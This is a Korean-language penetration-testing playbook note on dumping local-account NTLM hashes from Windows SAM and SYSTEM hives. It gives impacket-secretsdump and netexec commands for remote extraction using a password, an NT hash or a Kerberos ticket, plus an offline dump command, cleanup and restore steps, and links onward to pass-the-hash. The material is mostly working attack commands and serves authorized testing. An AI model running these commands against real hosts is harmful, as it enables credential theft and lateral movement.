---
tags:
  - 환경/windows
시작조건: ["대상 Windows 호스트의 원격 관리자급 SMB 작업 권한 또는 SAM·SYSTEM hive 확보"]
필요권한: ["대상 호스트의 로컬 관리자급 원격 작업 권한 또는 SAM·SYSTEM 파일 읽기 권한"]
필요조건: ["SMB 요청자 인증 수단 또는 같은 설치의 sam.save·system.save"]
결과: ["대상 Windows 호스트의 로컬 계정 NTLM hash"]
---

# Windows SAM 로컬 계정 해시 추출

## 한 줄 판단

대상 Windows 호스트에 원격 관리자급 SMB 작업을 수행할 수 있거나 SAM·SYSTEM hive를 확보했으면 로컬 계정별 NTLM hash를 추출한다.

## 사용할 때

- 현재 보유 정보: 대상 호스트의 관리자급 요청자 credential 또는 [[Windows SAM SECURITY SYSTEM 덤프]]로 확보한 SAM·SYSTEM 파일이 있다.
- 명령 실행 위치: SMB로 대상에 접근하는 Linux 공격 호스트 또는 hive 파일이 있는 Linux 분석 호스트다.
- 현재 가능한 행동과 결과: 로컬 계정 NTLM hash를 얻을 수 있지만 같은 이름의 도메인 계정 hash나 원격 관리자 권한으로 해석하지 않는다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 원격 경로 | 요청자 계정으로 대상 SMB 인증과 관리자급 원격 작업 가능 | `netexec smb`의 인증 주체와 `Pwn3d!` 확인 | 인증 성공과 원격 관리자 토큰 분리 확인 |
| 오프라인 경로 | 같은 설치·시점의 SAM·SYSTEM 확보 | 파일 출처와 존재 확인 | 누락·시점 불일치 hive 재획득 |
| 현재 계정 또는 인증 수단 | 요청자 비밀번호·NT hash·Kerberos ccache 중 하나 | 요청자 계정 범위와 principal 확인 | 로컬·도메인 계정 및 hash 소유자 재확인 |

## 실행

### Linux 공격 호스트에서 원격 추출

정확한 복구 기준이 필요하면 설치된 Impacket 버전의 `impacket-secretsdump` 경로를 사용한다. 실행 전 같은 요청자 인증으로 Remote Registry의 실행 상태·시작 유형과 `ADMIN$\Temp`의 기존 8자 `.tmp` 이름을 기록한다. 아래 wildcard는 조회에만 사용하고 삭제에는 사용하지 않는다.

```bash
impacket-services '<DOMAIN>/<REQUESTER>:<PASSWORD>@<TARGET>' status -name RemoteRegistry
impacket-services '<DOMAIN>/<REQUESTER>:<PASSWORD>@<TARGET>' config -name RemoteRegistry
impacket-smbclient '<DOMAIN>/<REQUESTER>:<PASSWORD>@<TARGET>'
```

```text
# impacket-smbclient prompt
use ADMIN$
cd Temp
ls ????????.tmp
exit
```

비밀번호 대신 NT hash·Kerberos를 사용하면 아래 dump와 같은 요청자·인증 방식을 기준선 명령에도 적용한다. 기준선 원문이나 실제 자격 증명을 Vault에 저장하지 않는다.

요청자 평문 비밀번호:

```bash
netexec smb <TARGET> -d <DOMAIN> -u <REQUESTER> -p '<PASSWORD>' --sam
impacket-secretsdump '<DOMAIN>/<REQUESTER>:<PASSWORD>@<TARGET>'
```

대상 로컬 요청자 계정:

```bash
netexec smb <TARGET> --local-auth -u <LOCAL_REQUESTER> -p '<PASSWORD>' --sam
```

요청자 NT hash:

```bash
netexec smb <TARGET> -d <DOMAIN> -u <REQUESTER> -H <NT_HASH> --sam
impacket-secretsdump -hashes :<NT_HASH> '<DOMAIN>/<REQUESTER>@<TARGET>'
```

요청자 Kerberos ccache:

```bash
KRB5CCNAME='<CCACHE_FILE>' klist
KRB5CCNAME='<CCACHE_FILE>' impacket-secretsdump -k -no-pass '<DOMAIN>/<REQUESTER>@<TARGET_FQDN>'
```

`<NT_HASH>`는 dump 결과로 얻을 로컬 계정 hash가 아니라 원격 작업을 요청하는 계정의 NT hash다.

### Linux 분석 호스트에서 오프라인 추출

```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

확인할 출력:

- `Dumping local SAM hashes`.
- `<LOCAL_USER>:<RID>:<LM_HASH>:<NT_HASH>:::` 형식의 로컬 계정 행.

## 변경 영향과 복구

오프라인 명령은 제공한 SAM·SYSTEM hive를 읽을 뿐 대상 Windows 상태를 바꾸지 않는다. Impacket 0.13.1의 원격 `impacket-secretsdump`는 Remote Registry가 중지·비활성 상태면 일시적으로 시작 유형을 demand로 바꾸고 실행하며, `%SystemRoot%\Temp`에 임의의 8자 `.tmp` hive를 만든다. 정상 종료에서는 임시 hive를 삭제하고 서비스의 기존 실행·시작 상태를 복원한다. 다른 버전은 먼저 `impacket-secretsdump -h`와 해당 버전 소스를 확인한다.

1. 정상 종료 로그의 `Cleaning up...` 뒤 Remote Registry 상태·시작 유형을 `impacket-services ... status -name RemoteRegistry`와 `config -name RemoteRegistry`로 다시 조회해 실행 전 기준과 대조한다.
2. client가 중단됐을 때만 `impacket-smbclient`로 `ADMIN$`, `cd Temp`, `ls ????????.tmp`를 다시 조회한다. 실행 전 목록에 없고 실행 시간대와 일치하는 `<EXACT_TEMP_HIVE_NAME>`을 하나로 확정할 수 있을 때만 `rm <EXACT_TEMP_HIVE_NAME>`을 실행하고 다시 목록을 확인한다. wildcard 삭제는 사용하지 않는다.
3. Remote Registry가 실행 전 `STOPPED`였다면 이번 실행 뒤 남아 있는 경우 `impacket-services '<DOMAIN>/<REQUESTER>:<PASSWORD>@<TARGET>' stop -name RemoteRegistry`로 중지한다. 실행 전 시작 유형이 `DISABLED`였다면 중지 확인 뒤 `impacket-services '<DOMAIN>/<REQUESTER>:<PASSWORD>@<TARGET>' change -name RemoteRegistry -start_type 4`로 복원하고 `status`·`config`를 다시 확인한다. 실행 전부터 실행 중이었다면 중지하지 않는다.
4. 터미널 출력을 파일로 별도 저장했다면 생성 전 부재를 확인한 exact 경로만 승인된 보존·폐기 정책으로 처리한다. 원격 입력으로 사용한 ccache와 오프라인 SAM·SYSTEM 원본은 이 문서가 만든 자원이 아니므로 삭제하지 않는다.

NetExec `--sam`의 내부 수집 방식과 정리 로그는 버전에 따라 달라질 수 있다. 해당 경로를 선택했다면 도구 버전과 첫 변경 출력을 기준으로 생성 자원을 확인하기 전에는 복구 완료로 판정하지 않는다. 원격 연결이 끊겨 임시 hive나 서비스 상태를 대조할 수 없으면 `원격 복구 미확인`이며, 이미 표시·저장된 NTLM hash와 인증·감사 기록은 process 종료로 되돌릴 수 없다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `Dumping local SAM hashes`와 계정별 NTLM hash | SAM 복호화 성공 | 로컬 계정 hash 확보 | [[Pass the Hash]] 또는 [[오프라인 해시 크래킹]] |
| `STATUS_LOGON_FAILURE` | 요청자 인증 실패 | dump 미실행 | 계정 범위·비밀번호·hash·ticket 확인 |
| `rpc_s_access_denied` | 인증은 됐지만 원격 관리자 권한 부족 | 원격 추출 실패 | 요청자 토큰과 로컬 관리자급 작업 권한 확인 |

## 확인할 출력과 권한

- 요청자 인증 성공과 대상 로컬 계정 hash 출력을 분리한다.
- 추출된 hash는 대상 호스트의 로컬 계정에 속하며 같은 이름의 도메인 계정 hash가 아니다.
- hash 사용 뒤 실제 원격 로그인 권한과 관리자 권한을 따로 확인한다.

## 관련 상태 라우터

- [[확보한 자격 증명으로 원격 접근 경로 선택]]

## 관련 도구

- [[impacket-secretsdump]]
- [[netexec]]
- [[klist]]

## 참고 링크

- [Impacket 0.13.1 secretsdump](https://github.com/fortra/impacket/blob/impacket_0_13_1/impacket/examples/secretsdump.py)
- [Impacket 0.13.1 services](https://github.com/fortra/impacket/blob/impacket_0_13_1/examples/services.py)
